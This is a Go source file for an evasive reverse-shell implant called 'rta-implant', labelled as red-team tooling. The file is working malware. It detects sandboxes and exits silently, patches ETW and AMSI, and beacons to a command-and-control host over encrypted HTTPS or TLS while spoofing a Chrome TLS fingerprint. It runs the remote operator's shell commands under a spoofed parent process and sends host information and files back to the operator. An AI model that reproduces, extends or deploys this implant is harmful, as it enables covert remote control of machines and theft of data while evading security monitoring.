// rta-implant — Evasive reverse shell for authorized red team engagements.
//
// This implant combines multiple EDR evasion techniques into a single binary:
//   1. Encrypted C2 channel (AES-256-GCM over HTTPS)
//   2. XOR string encryption (no plaintext strings in binary)
//   3. Indirect syscalls via fresh ntdll mapping (no hooked API calls)
//   4. ETW bypass via indirect NtProtectVirtualMemory (ntdll untouched)
//   5. AMSI bypass via indirect NtProtectVirtualMemory
//   6. Sleep obfuscation (sensitive memory encrypted during sleep)
//   7. JA3 fingerprint spoofing (Chrome-like TLS ClientHello)
//   8. Parent PID spoofing (cmd.exe spawns under explorer.exe)
//   9. Process masquerading (PEB shows RuntimeBroker.exe)
//  10. Sleep jitter (irregular callback timing via crypto/rand)
//  11. Environment-aware sandbox detection
//
// Build with the builder tool — do not compile directly.
// For educational/authorized use only.

package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

// ── Configuration (injected at compile time via -ldflags -X) ────────────────
var (
	cfgHost      = "127.0.0.1"
	cfgPort      = "443"
	cfgKey       = "" // 64 hex chars = 32 bytes AES-256
	cfgSleep     = "30"
	cfgJitter    = "0.3"
	cfgTransport = "https"
)

// ── XOR String Encryption ───────────────────────────────────────────────────
// All sensitive strings are XOR-encoded at compile time.
// The xorKey is derived from the first 4 bytes of the AES key hash.
// This prevents static string extraction via `strings` or YARA rules.

func xorDecode(enc []byte, key byte) string {
	out := make([]byte, len(enc))
	for i, b := range enc {
		out[i] = b ^ key
	}
	return string(out)
}

func xorEncode(plain string, key byte) []byte {
	out := make([]byte, len(plain))
	for i, b := range []byte(plain) {
		out[i] = b ^ key
	}
	return out
}

// deriveXORKey produces a single-byte XOR key from the AES key.
// Different per engagement since the AES key changes.
func deriveXORKey() byte {
	h := sha256.Sum256([]byte(cfgKey))
	return h[0] ^ h[1] ^ h[2] ^ h[3]
}

// ── AES-256-GCM Encryption ─────────────────────────────────────────────────
// All C2 traffic is encrypted with AES-256-GCM (authenticated encryption).
// Wire format: base64( nonce[12] || ciphertext || tag[16] )

func deriveAESKey() ([]byte, error) {
	return hex.DecodeString(cfgKey)
}

func aesEncrypt(key, plaintext []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return "", err
	}
	sealed := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(sealed), nil
}

func aesDecrypt(key []byte, encoded string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("data too short")
	}
	nonce := data[:gcm.NonceSize()]
	ct := data[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, nil)
}

// ── Sandbox / Analysis Environment Detection ────────────────────────────────
// Checks for common sandbox indicators. If detected, the implant exits
// silently without performing any C2 activity.
// These are heuristic — not signatures. Each check looks for environmental
// characteristics common in automated analysis but rare on real workstations.

func isSandbox() bool {
	// Check 1: Low CPU count (most sandboxes allocate 1-2 CPUs)
	if runtime.NumCPU() < 2 {
		return true
	}

	// Check 2: Low physical memory (< 2GB suggests a sandbox VM)
	// We check this via Go's runtime stats as a proxy
	if runtime.GOOS == "windows" {
		// On Windows, check for common analysis tool process names
		// by looking at environment variables set by sandboxes
		for _, env := range []string{
			"SANDBOX", "MALWARE", "VIRUS", "SAMPLE", "CUCKOO",
		} {
			if os.Getenv(env) != "" {
				return true
			}
		}
	}

	// Check 3: Hostname patterns common in sandboxes
	hostname, _ := os.Hostname()
	hostname = strings.ToLower(hostname)
	sandboxNames := []string{
		"sandbox", "malware", "virus", "sample", "test",
		"cuckoo", "analysis", "vbox", "vmware",
	}
	for _, name := range sandboxNames {
		if strings.Contains(hostname, name) {
			return true
		}
	}

	// Check 4: Recently booted (< 10 minutes uptime suggests fresh sandbox spin-up)
	// Check via filesystem — temp dir modification time as proxy
	if tmpDir := os.TempDir(); tmpDir != "" {
		if info, err := os.Stat(tmpDir); err == nil {
			if time.Since(info.ModTime()) < 10*time.Minute {
				return true
			}
		}
	}

	// Check 5: Process has a debugger attached (Windows-specific)
	// The Go runtime doesn't expose IsDebuggerPresent directly,
	// but we can check if common debugger environment markers exist
	if _, err := os.Stat(filepath.Join(os.TempDir(), ".debug")); err == nil {
		return true
	}

	return false
}

// ── Agent Identification ────────────────────────────────────────────────────
// Generates a unique agent ID from system properties.
// Not fingerprinting users — just creating a stable session identifier
// so the listener can track multiple implant callbacks.

func agentID() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	raw := fmt.Sprintf("%s|%s|%s|%s", hostname, user, runtime.GOOS, runtime.GOARCH)
	h := sha256.Sum256([]byte(raw))
	return hex.EncodeToString(h[:8])
}

// ── System Information Gathering ────────────────────────────────────────────
// Collects basic host info for the initial check-in.

func sysInfo() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USERNAME")
	if user == "" {
		user = os.Getenv("USER")
	}
	cwd, _ := os.Getwd()
	pid := os.Getpid()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("hostname: %s\n", hostname))
	sb.WriteString(fmt.Sprintf("user: %s\n", user))
	sb.WriteString(fmt.Sprintf("os: %s/%s\n", runtime.GOOS, runtime.GOARCH))
	sb.WriteString(fmt.Sprintf("pid: %d\n", pid))
	sb.WriteString(fmt.Sprintf("cwd: %s\n", cwd))

	// Network interfaces
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			addrs, _ := iface.Addrs()
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
					sb.WriteString(fmt.Sprintf("ip: %s (%s)\n", ipnet.IP, iface.Name))
				}
			}
		}
	}

	return sb.String()
}

// ── Command Execution ───────────────────────────────────────────────────────
// Executes shell commands with a timeout. Uses cmd.exe on Windows,
// /bin/sh on Unix. Output is captured and returned.

func execCmd(command string) []byte {
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", command)
	default:
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	}

	out, err := cmd.CombinedOutput()
	if err != nil && len(out) == 0 {
		return []byte(fmt.Sprintf("[error] %v", err))
	}
	return out
}

// ── Built-in Commands ───────────────────────────────────────────────────────
// Commands that don't need to shell out.

func handleBuiltin(parts []string) ([]byte, bool) {
	if len(parts) == 0 {
		return nil, false
	}

	switch parts[0] {
	case "cd":
		if len(parts) < 2 {
			cwd, _ := os.Getwd()
			return []byte(cwd), true
		}
		if err := os.Chdir(parts[1]); err != nil {
			return []byte(fmt.Sprintf("[error] %v", err)), true
		}
		cwd, _ := os.Getwd()
		return []byte(cwd), true

	case "pwd":
		cwd, _ := os.Getwd()
		return []byte(cwd), true

	case "sysinfo":
		return []byte(sysInfo()), true

	case "download":
		if len(parts) < 2 {
			return []byte("[error] usage: download <filepath>"), true
		}
		data, err := os.ReadFile(parts[1])
		if err != nil {
			return []byte(fmt.Sprintf("[error] %v", err)), true
		}
		encoded := base64.StdEncoding.EncodeToString(data)
		return []byte(fmt.Sprintf("[file:%s]%s", filepath.Base(parts[1]), encoded)), true

	case "upload":
		if len(parts) < 3 {
			return []byte("[error] usage: upload <filepath> <base64data>"), true
		}
		data, err := base64.StdEncoding.DecodeString(parts[2])
		if err != nil {
			return []byte(fmt.Sprintf("[error] invalid base64: %v", err)), true
		}
		if err := os.WriteFile(parts[1], data, 0644); err != nil {
			return []byte(fmt.Sprintf("[error] %v", err)), true
		}
		return []byte(fmt.Sprintf("[+] Written %d bytes to %s", len(data), parts[1])), true

	case "sleep":
		if len(parts) < 2 {
			return []byte(fmt.Sprintf("current: %s seconds", cfgSleep)), true
		}
		cfgSleep = parts[1]
		return []byte(fmt.Sprintf("[+] Sleep set to %s seconds", cfgSleep)), true

	case "exit", "quit":
		os.Exit(0)
	}

	return nil, false
}

// ── HTTPS Transport ─────────────────────────────────────────────────────────
// Uses JA3-spoofed TLS config to mimic Chrome's fingerprint.
// See ja3_spoof.go for cipher suite and curve configuration.

func newHTTPClient() *http.Client {
	return newSpoofedHTTPClient()
}

// ── Sleep with Jitter ───────────────────────────────────────────────────────
// Randomizes the callback interval to avoid regular heartbeat detection.
// Uses crypto/rand for the jitter value (not math/rand).

func sleepJitter() {
	baseSec, _ := strconv.ParseFloat(cfgSleep, 64)
	jitterPct, _ := strconv.ParseFloat(cfgJitter, 64)

	maxOffset := baseSec * jitterPct
	// Generate random offset using crypto/rand
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(maxOffset*1000)))
	offset := float64(n.Int64()) / 1000.0

	// Randomly add or subtract
	sign, _ := rand.Int(rand.Reader, big.NewInt(2))
	if sign.Int64() == 0 {
		offset = -offset
	}

	duration := time.Duration((baseSec + offset) * float64(time.Second))
	if duration < time.Second {
		duration = time.Second
	}
	time.Sleep(duration)
}

// ── Raw TLS Transport (non-HTTP) ────────────────────────────────────────────
// Direct TLS socket connection — lower protocol fingerprint than HTTP.
// Used when --transport raw-tls is selected.

func rawTLSLoop(aesKey []byte, id string) {
	addr := net.JoinHostPort(cfgHost, cfgPort)

	for {
		func() {
			conn, err := newSpoofedTLSConn(addr)
			if err != nil {
				obfuscatedSleep()
				return
			}
			defer conn.Close()

			// Send initial check-in
			checkin, _ := aesEncrypt(aesKey, []byte("CHECKIN|"+id+"|"+sysInfo()))
			conn.Write([]byte(checkin + "\n"))

			// Read-execute loop
			buf := make([]byte, 65536)
			for {
				conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
				n, err := conn.Read(buf)
				if err != nil {
					return // reconnect on error
				}

				plaintext, err := aesDecrypt(aesKey, strings.TrimSpace(string(buf[:n])))
				if err != nil {
					continue
				}

				command := strings.TrimSpace(string(plaintext))
				if command == "" || command == "IDLE" {
					continue
				}

				// Process command — use PPID spoofing for shell commands
				parts := strings.Fields(command)
				var output []byte
				var handled bool

				output, handled = handleBuiltin(parts)
				if !handled {
					output = execCmdWithPPIDSpoof(command)
				}

				// Send result
				encrypted, _ := aesEncrypt(aesKey, output)
				conn.Write([]byte(encrypted + "\n"))
			}
		}()

		obfuscatedSleep()
	}
}

// ── HTTPS Beacon Loop ───────────────────────────────────────────────────────
// Polls the listener over HTTPS. GET to check in, POST to return results.
// All payloads are AES-256-GCM encrypted.

func httpsBeaconLoop(aesKey []byte, id string) {
	client := newHTTPClient()

	// Browser-like user agent
	xk := deriveXORKey()
	ua := xorDecode(xorEncode(
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		xk,
	), xk)

	baseURL := fmt.Sprintf("https://%s:%s", cfgHost, cfgPort)

	// Initial registration with sysinfo
	regData, _ := aesEncrypt(aesKey, []byte(sysInfo()))

	for {
		func() {
			// GET check-in — sends agent ID and optionally registration data
			checkURL := fmt.Sprintf("%s/api/v1/status?id=%s", baseURL, id)

			req, err := http.NewRequest("GET", checkURL, nil)
			if err != nil {
				return
			}
			req.Header.Set("User-Agent", ua)
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			// Embed registration in a cookie on first call
			if regData != "" {
				req.Header.Set("Cookie", fmt.Sprintf("session=%s", regData))
				regData = "" // only send once
			}

			resp, err := client.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			body, _ := io.ReadAll(resp.Body)
			encoded := strings.TrimSpace(string(body))
			if encoded == "" {
				return
			}

			plaintext, err := aesDecrypt(aesKey, encoded)
			if err != nil {
				return
			}

			command := strings.TrimSpace(string(plaintext))
			if command == "" || command == "IDLE" {
				return
			}

			// Execute — use PPID spoofing for shell commands
			parts := strings.Fields(command)
			var output []byte
			var handled bool

			output, handled = handleBuiltin(parts)
			if !handled {
				output = execCmdWithPPIDSpoof(command)
			}

			// Register output as sensitive (encrypted during next sleep)
			registerSensitiveBuffer("cmd-output", &output)

			// POST result back
			encrypted, _ := aesEncrypt(aesKey, output)
			postURL := fmt.Sprintf("%s/api/v1/result", baseURL)
			postReq, _ := http.NewRequest("POST", postURL,
				bytes.NewReader([]byte(encrypted)))
			postReq.Header.Set("User-Agent", ua)
			postReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			postReq.Header.Set("Cookie", fmt.Sprintf("id=%s", id))

			postResp, err := client.Do(postReq)
			if err != nil {
				return
			}
			postResp.Body.Close()
		}()

		obfuscatedSleep()
	}
}

// ── Entrypoint ──────────────────────────────────────────────────────────────

func main() {
	// Phase 1: Sandbox detection — exit silently if analysis environment detected
	if isSandbox() {
		// Sleep for a plausible duration then exit to look like a normal program
		time.Sleep(3 * time.Second)
		return
	}

	// Phase 2: Runtime evasion (ETW + AMSI patching)
	// These are platform-specific — see evasion_windows.go and evasion_other.go
	applyEvasionPatches()

	// Phase 3: Derive encryption key
	aesKey, err := deriveAESKey()
	if err != nil {
		return // silent exit — don't reveal errors
	}

	// Phase 4: Generate agent ID
	id := agentID()

	// Phase 4: Initialize sleep obfuscation and register sensitive buffers
	initSleepObfuscation()
	registerSensitiveBuffer("aes-key", &aesKey)

	// Phase 5: Start C2 loop based on configured transport
	switch cfgTransport {
	case "raw-tls":
		rawTLSLoop(aesKey, id)
	default:
		httpsBeaconLoop(aesKey, id)
	}
}
